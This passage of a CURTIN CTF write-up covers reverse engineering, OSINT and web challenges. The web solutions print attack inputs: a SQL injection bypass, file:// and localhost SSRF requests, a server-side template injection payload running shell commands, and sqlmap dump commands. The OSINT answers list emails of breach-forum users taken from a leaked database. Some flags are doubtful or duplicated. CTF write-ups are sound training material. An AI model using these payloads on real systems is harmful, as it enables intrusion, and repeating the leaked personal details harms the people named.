+Then I take the largest one which is SecLists. Used that as wordlist in john but didn’t get the password. But I noticed that there are only 2019 until 2022 as the wordlist is old. So I add 2023 and 2024 MANUALLY cause I don’t know how to automate it. But I do it little by little and use john.
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Reverse Engineering
+
+***
+
+### just\_ring
+
+**Description:**\
+as it sounds
+
+**Flag:** CURTIN\_CTF{3l1t3H4ck3rSk1llzF0rTh3W1n2024!}
+
+```bash
+(kruphix@Zeqzoq)-[/mnt/c/Users/blast/Downloads/curtin]
+$ chmod +x just_ring
+
+(kruphix@Zeqzoq)-[/mnt/c/Users/blast/Downloads/curtin]
+$ ./just_ring
+Enter your favorite color: green
+Your favorite color is: green
+The secret message has been saved to 'encoded_secret.txt'
+
+(kruphix@Zeqzoq)-[/mnt/c/Users/blast/Downloads/curtin]
+$ cat encoded_secret.txt
+M2wxdDNINGNrM3JTazFsbHpGMHJUaDNXMW4yMDI0IQAA
+
+(kruphix@Zeqzoq)-[/mnt/c/Users/blast/Downloads/curtin]
+$ echo "M2wxdDNiNGNrM3JtazFsbHpGMHJUaDNXMW4yMDI0IQAA" | base64 -d
+3l1t3H4ck3rSk1llzF0rTh3W1n2024!
+```
+
+***
+
+### broken
+
+**Description:**\
+Would you really rather have my payload execute on yours?
+
+**Flag:** flag{99558804145160985476\_ease\_in}
+
+```bash
+$ strings broken > output.txt
+```
+
+Then CTRL+F the flag
+
+***
+
+### Wrot
+
+**Description:**\
+It might help to identify the algorithm here :P\
+
+
+ACME. Inc directed its cryptography team to encode the flag in a way that no bits are lost. A flag was encrypted and stored in the comment within the file - can you help the team find the lost flag?
+
+Flag format: flag{...}
+
+Just reverse the python script to get the flag.
+
+**Flag:** flag{JL8LKBff7dv5wpvBI9TC\_no\_bits\_1057}
+
+```python
+def dec_shift(n: int, bits: int, shift: int, direction: str = 'right') -> int:
+    bit_len = bits
+
+    if direction == 'right':
+        return ((n >> shift) | (n << (bit_len - shift))) & ((1 << bit_len) - 1)
+    elif direction == 'left':
+        return ((n << shift) | (n >> (bit_len - shift))) & ((1 << bit_len) - 1)
+    else:
+        raise ValueError("Invalid direction")
+
+
+# The encrypted list (replace with the actual encrypted list if different)
+enc = [153, 27, 133, 217, 237, 146, 49, 14, 49, 210, 9, 153, 153, 205, 145, 157, 212, 221, 193, 157, 9, 82, 228, 21, 13, 215, 185, 219, 125, 152, 165, 29, 205, 215, 177, 12, 212, 205, 245]
+
+# Decrypt the flag
+def decrypt_flag(enc_list):
+    decrypted_flag = []
+    bits = 8
+
+    for i in range(len(enc_list)):
+        if (i % 2 == 0):
+            decrypted_flag.append(chr(dec_shift(enc_list[i], bits, 2, 'right')))
+        else:
+            decrypted_flag.append(chr(dec_shift(enc_list[i], bits, 2, 'left')))
+
+    return ''.join(decrypted_flag)
+
+
+# Call the decryption function
+decrypted_flag_str = decrypt_flag(enc)
+print(f'Decrypted Flag: {decrypted_flag_str}')
+```
+
+Then CTRL+F the flag
+
+***
+
+### PinValidator
+
+**Description:**\
+Unlock the app with the PIN to get the flag\
+
+
+Encase the flag within:: CURTIN\_CTF{}
+
+**Flag:** CURTIN\_CTF{H4ckTh3P14n3tC0d3rL1f3F0r3v3r}
+
+I use [online decompiler](https://www.decompiler.com/) to decompile the file. Then extract all the dex files and change to jar.
+
+```bash
+$ d2j-dex2jar classes.dex
+dex2jar classes.dex -> ./classes-dex2jar.jar
+
+$ d2j-dex2jar classes2.dex
+dex2jar classes2.dex -> ./classes2-dex2jar.jar
+
+$ d2j-dex2jar classes3.dex
+dex2jar classes3.dex -> ./classes3-dex2jar.jar
+
+$ d2j-dex2jar classes4.dex
+dex2jar classes4.dex -> ./classes4-dex2jar.jar
+```
+
+Read the jar file and search for PIN. You should see `7331`. Run the app and enter the PIN to get the flag
+
+***
+
+## Osint
+
+***
+
+### The Package
+
+**Description:**\
+Can you get the details please? All I have is this:\
+278154251425\
+Where was the package picked up? When? Add the dimensions too (in cms).\
+Format: CURTIN\_CTF{Where\_DD\_MM\_YYYY\_l\_b\_h}
+
+**Flag:** CURTIN\_CTF{Beckton\_12\_08\_2024\_60\_31\_20}
+
+{% embed url="https://parcelsapp.com/en/tracking/278154251425" %}
+
+![](<../.gitbook/assets/image (15).png>)&#x20;
+
+***
+
+### Divulger Part 1
+
+**Description:**\
+A person with the online alias 'greekguy' had leaked details of Turkish Phone Number IDs.\
+What e-mail was the person using?
+
+**Flag:** CURTIN\_CTF{kpopayda@gmail.com}
+
+Search for greekguy and breachforum and stumbled upon this X.
+
+<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+Got email in basic\_info
+
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Divulger Part 2
+
+**Description:**\
+We have an intel that the same person had "Self-banned" himself.\
+When did this happen?
+
+**Flag:** CURTIN\_CTF{28\_11\_2022}
+
+In mybb\_banned got dateline in unix timestamp
+
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+&#x20;
+
+***
+
+### Divulger Part 3
+
+**Description:**\
+It seems greekguy was communicating with Stranger020.\
+What email was Stranger020 using? When did the person register on the forum?\
+Format: CURTIN\_CTF{email\_dd\_mm\_yyyy}
+
+**Flag:** CURTIN\_CTF{sergeyevic@protonmail.com\_12\_11\_2022}
+
+From the part 1 and part 2 of this challenge, we were at this [site](https://bf.based.re/search/greekguy).
+
+To get know about this Stranger020, we try to search for its username by changing the url as below. Straight away, we got the email.
+
+```markdown
+https://bf.based.re/search/Stranger020
+```
+
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+As I go through one by one, I get a very long information at ‘show mybb\_usernamehistory’. Scrolled it to the side and we get the dateline in unix timestamp also.
+
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+Change it using online tool using the [link here](https://www.unixtimestamp.com/) and we get the date, and as part of the flag.
+
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Divulger Part 4
+
+**Description:**\
+There were talks of dumping the entire health Management database\
+Which site were the leakers chatting about? What was the Storage Engine of the database?\
+Format: CURTIN\_CTF{site\_storageengine}
+
+**Flag:** CURTIN\_CTF{hsys.saglik.gov.tr\_MyISAM}
+
+Found the website during 12 hour searching for email.
+
+<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+Guessed the storage engine
+
+<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Car on Fire Part 1
+
+**Description:**\
+Owner of the car?\
+Format: CURTIN\_CTF{Firstname\_Lastname}
+
+**Flag:** CURTIN\_CTF{Michael\_Morris}
+
+Snip the video and reverse searched it
+
+<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+The owner’s wife posted the video on X.
+
+<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+Tried my luck at google and got it.
+
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Car on Fire Part 2
+
+**Description:**\
+What kind of air filter does the car come equipped with?\
+NOTE: Seperate the words with underscores
+
+**Flag:** CURTIN\_CTF{High\_Efficiency\_Particulate\_Air} (NOT SURE CANT REMEMBER)
+
+Search Google and used sanity check for this
+
+<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Car on Fire Part 3
+
+**Description:**\
+VIN of the car?
+
+**Flag:** CURTIN\_CTF{5YJSA1DP9CFP02519}
+
+My approach, use the number plate on US warranty car website. https://vincheck.info/check/report-summary.php?vin=5YJSA1DP9CFP02519
+
+***
+
+### Car on Fire Part 4
+
+**Description:**\
+Name the food store near which the car was spotted.
+
+**Flag:** CURTIN\_CTF{5YJSA1DP9CFP02519}
+
+Just walk around the google map. 7800 Santa Monica Blvd is the accident spot.
+
+<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Crash at the Airdrome Part 1
+
+**Description:**\
+A: What was the engine model of the aircraft?\
+B: When was the aircraft manufactured? (DD-MM-YYYY)
+
+**Flag:** CURTIN\_CTF{CFM56-7B24E\_19-02-2013}
+
+Given an image of Lion Air flight which I knew and heard about this incident.
+
+<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+Immediately look for its incident on Wikipedia and got the details of the challenge wanted. Wrap the engine model and the manufactured date in the flag format and there we go!
+
+<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Crash at the Airdrome Part 2
+
+**Description:**\
+A: When was the first flight of this aircraft model?\
+Flag Format: CURTIN\_CTF{DD\_MM\_YYYY}
+
+**Flag:** CURTIN\_CTF{31\_07\_1997}
+
+At the first place, I thought that it refers to first flight of the aircraft PK-LKS. Lol how dumb am I trying a lot on that. Then I realized it mention about the model! Quick search about the first flight date of aircraft model Boeing 737-8GP through ChatGPT and I got the date, also as the flag.
+
+<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Crash at the Airdrome Part 3
+
+**Description:**\
+A: Distance between the airports?\
+NOTE: Answer includes digits only (km). Ignore decimal values.\
+
+
+B: What was the name of the PIC?\
+
+
+C: What was the part number of the aircraft's Terrain Awareness and Alerting System?\
+
+
+Flag format: CURTIN\_CTF{A\_BFirstName\_BLastName\_C}
+
+**Flag:** CURTIN\_CTF{861\_Mahlup\_Gozali\_965-1690-055}
+
+Let’s find one by one. First I tried to find distance from that Hussein Sastranegara Airport to Denpasar Bali Airport. But I found that first airport is no longer functioning, so I decided to find an old flight involving this two. I just search flight from WICC (first airport) to WADD( second airport) and it gives this [website](https://www.flightaware.com/live/flight/PKAXX/history/20220805/0540Z/WICC/WADD).
+
+Scroll a bit downward and we can see the distance between these two airports. Just change it to km using any kind of conversion tools to get the distance in kilometers. One down!
+
+<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+
+Next it asked about the pilot in charge, easy one I guess. Back to the Wikipedia we used in the part 1, it gives us the name of the pilot, Mr. Mahlup Gozali. Two down!
+
+<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+
+Last one, might be a bit tricky at first. But luckily I know a quick way to find all information about an incident. Its all through a report. Searched for the incident report and I found a [pdf](https://asn.flightsafety.org/reports/2013/20130413_B738_PK-LKS.pdf) file about it.
+
+Suuuuper lazy to find one by one, so we just look keyword for ‘part number’ and we found it. But it written there about EGPWS, doesn’t sure that does that the same thing for TAWS ?
+
+After google for some info, yes it is. So we obtained the last piece of the flag. Be sure to include the ‘-‘ too. Been tricked for 2 hours because of that hm.
+
+***
+
+## Web
+
+***
+
+### Easy Login
+
+**Description:**\
+Hey, found this super secure login page. Seems like the database admin forgot to do some sanity checks\
+Challenge Link: http://18.141.159.205:8001/\
+
+
+**Flag:** CURTIN\_CTF{sql\_1nj3ct1on\_v1ct0ry}
+
+Use simple SQL injection to login. I used `' or 1=1 --`
+
+***
+
+### Crumb trails
+
+**Description:**\
+The website theme seems to be telling me something ...\
+Challenge Link: http://18.141.159.205:8002/\
+
+
+**Flag:** CURTIN\_CTF{c00kies\_cutt3r\_is\_c00l}
+
+Change the cookie to “chocolate”
+
+***
+
+### Sneaky Source
+
+**Description:**\
+The website allows one to retrieve the source code of a given URL, how does that really work?\
+Challenge Link: http://54.255.222.103:8003/\
+
+
+**Flag:** CURTIN\_CTF{S3rver\_S1de\_Surf1ng}
+
+I used `file:////app/flag.txt`
+
+***
+
+### Valuable Feedback
+
+**Description:**\
+The author wants some feedback on th ewebsite quality, make sure to preview and send him some good reviews.\
+Challenge Link: http://54.255.222.103:8004/\
+
+
+**Flag:** CURTIN\_CTF{t3mpl4t3s\_ar3\_e4sy\_t0\_cr4ck}
+
+Use this [github](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#aspnet-razor---command-execution) and copy paste all of them.
+
+This one works
+
+```markdown
+{{ self.__init__.__globlas__.__builtins__.__import__('os').popen('id')read() }}`
+```
+
+Here we successfully exploit it.
+
+<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+
+Change id to cat flag.txt then got flag
+
+```markdown
+{{ self.__init__.__globlas__.__builtins__.__import__('os').popen('cat flag.txt')read() }}`
+```
+
+***
+
+### Internal View
+
+**Description:**\
+The flag is hidden at /internal/flag path, but seems like it is not accessible to everyone...\
+Challenge Link: http://54.255.222.103:8005/\
+A little birdie just told me that the flag is in `/internal/flag` and hosted on port 5000 (internally..)
+
+**Flag:** CURTIN\_CTF{s3rv3rs\_4re\_n0t-so\_busy}
+
+I submit this and got flag\
+`http://127.1:5000/internal/flag`
+
+***
+
+### Hard Login
+
+**Description:**\
+The admin has now hid the flag somewhere deeper, how do we fnd it now?\
+Challenge Link: http://47.128.145.75:8006/\
+Hint: The DBA guy said flag is stored in a table called config with param=flag
+
+**Flag:** the web is down until the end of the ctf when I want to start do writeup
+
+{% hint style="warning" %}
+We solved this web challenge early and doesn’t do the writeup on the spot. Don’t know why the creator release a hint because we already solved it but nvm. The challenge creator afk and the web host is down from around 4am to the end of the CTF. So we are very sorry we couldn’t provide the exact solution. But here’s the concept.
+{% endhint %}
+
+Intercept the GET request from the user query (There was login query and user query) in burp suite. Copy the request and paste it in a text file.
+
+```markdown
+GET /search?query=user HTTP/1.1
+Host: 47.128.145.75:8006
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://47.128.145.75:8006/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9,ms;q=0.8
+Connection: keep-alive
+```
+
+Using the interception information, use sqlmap to automate a payload to dump the database. First we search for available table name. (As we do this before the hint so we do not know the table name). The hint is saying that there is flag in config table
+
+```bash
+python sqlmap.py -r "web2.txt" --tables
+```
+
+<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+
+The command we are using is something like this.
+
+```bash
+python sqlmap.py -r "web.txt" --batch --level=5 --risk=3 -t config --dump
+```
+
+The web is down so there is no screenshot.
